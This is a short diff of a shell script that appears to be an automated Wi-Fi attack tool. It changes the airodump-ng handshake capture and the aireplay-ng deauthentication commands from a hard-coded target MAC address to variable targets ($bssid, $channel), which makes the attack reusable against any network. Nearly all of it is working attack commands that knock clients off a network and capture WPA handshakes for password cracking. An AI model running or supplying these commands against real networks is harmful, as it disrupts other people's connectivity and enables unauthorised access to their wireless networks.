@@ -227,11 +227,11 @@ echo "Remember to check your spam folder!"
 sleep 3
 ./raspberry.sh
 monitor
-#sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
-sudo airodump-ng --bssid 30:B5:C2:9A:64:12 --channel 11 --output-format pcap --write handshake wlan0mon > /dev/null &
+sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
+#sudo airodump-ng --bssid 30:B5:C2:9A:64:12 --channel 11 --output-format pcap --write handshake wlan0mon > /dev/null &
 echo -e "[${Green}wlan0mon${White}] Sending DeAuth to target..."
-#sudo aireplay-ng --deauth 20 -a $bssid wlan0mon
-sudo aireplay-ng --deauth 20 -a 30:B5:C2:9A:64:12 wlan0mon
+sudo aireplay-ng --deauth 20 -a $bssid wlan0mon
+#sudo aireplay-ng --deauth 20 -a 30:B5:C2:9A:64:12 wlan0mon
 sudo chmod -R 755 air-script
 sudo airmon-ng stop wlan0mon
 sudo ifconfig wlan0 up
